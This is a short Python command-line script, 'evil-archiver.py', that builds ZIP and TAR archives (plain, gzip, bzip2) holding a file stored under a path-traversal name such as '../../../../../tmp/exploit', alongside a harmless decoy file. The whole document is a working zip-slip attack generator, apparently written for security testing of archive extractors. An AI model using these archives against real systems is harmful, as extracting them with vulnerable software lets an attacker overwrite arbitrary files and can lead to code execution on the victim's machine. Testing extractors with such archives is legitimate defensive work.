#!/usr/bin/env python

__author__ = "Giulio Comi, Gabriel Geraldino"
__date__ = "2024/11/23"

import tarfile
import zipfile
import argparse


def create_malicious_archives(evilfile, safefile, filename):
    """
    Creates multiple archives (ZIP, TAR, TAR.GZ, TAR.BZ2) with a tampered filename.

    Args:
        evilfile (str): File to include in the archive with a path traversal pattern.
        safefile (str): Safe file to include in the archive.
        filename (str): Malicious filename to inject.
    """
    try:
        # Generate the malicious ZIP file
        with zipfile.ZipFile("evil.zip", "w") as zf:
            zf.write(evilfile, filename)
            zf.write(safefile, safefile)
        print("Created: evil.zip")

        # Generate the malicious TAR file
        with tarfile.open("evil.tar", mode="w") as out:
            out.add(evilfile, filename)
            out.add(safefile, safefile)
        print("Created: evil.tar")

        # Generate the malicious TAR.GZ file
        with tarfile.open("evil.tar.gz", mode="w:gz") as out:
            out.add(evilfile, filename)
            out.add(safefile, safefile)
        print("Created: evil.tar.gz")

        # Generate the malicious TAR.BZ2 file
        with tarfile.open("evil.tar.bz2", mode="w:bz2") as out:
            out.add(evilfile, filename)
            out.add(safefile, safefile)
        print("Created: evil.tar.bz2")

    except Exception as e:
        print(f"Error creating archives: {e}")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="evil-archiver.py")
    parser.add_argument(
        "-e",
        "--evilfile",
        required=True,
        help="Path to the file to include in the archive with path traversal.",
    )
    parser.add_argument(
        "-s",
        "--safefile",
        required=True,
        help="Path to the safe file to include in the archive.",
    )
    parser.add_argument(
        "-n",
        "--filename",
        required=True,
        help="Tampered filename with path traversal pattern (e.g., '../../../../../tmp/exploit').",
    )

    args = parser.parse_args()

    create_malicious_archives(args.evilfile, args.safefile, args.filename)
